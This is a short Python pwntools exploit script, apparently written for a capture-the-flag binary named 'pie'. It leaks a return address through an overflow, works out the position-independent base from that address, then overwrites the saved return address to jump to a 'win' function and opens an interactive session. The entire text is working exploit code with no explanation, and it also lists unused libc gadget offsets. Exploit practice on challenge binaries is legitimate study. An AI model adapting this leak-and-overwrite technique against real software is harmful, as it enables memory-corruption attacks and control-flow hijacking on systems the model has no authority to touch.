from pwn import * #64

p = process("./pie")

e = ELF("./pie")

libc = e.libc
puts_plt = 0x1090
puts_got = 0x3fb0
pop_rdi = 0x1323
system_plt = 0x10a0
win = 0x126f

one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

payload = b"a"*0x17

#payload += b"z"

p.sendline(payload)

p.recvuntil(b"\n")

ret_addr=u64(p.recv(6).ljust(8,b"\x00"))

log.info(hex(ret_addr))

pie_base = ret_addr - 0x12ae

log.info(hex(pie_base))

win_addr = pie_base + 0x1277
log.info(hex(win_addr))

payload2 = b"a"*0x18

payload2 += p64(win_addr)
p.send(payload2)
p.interactive()
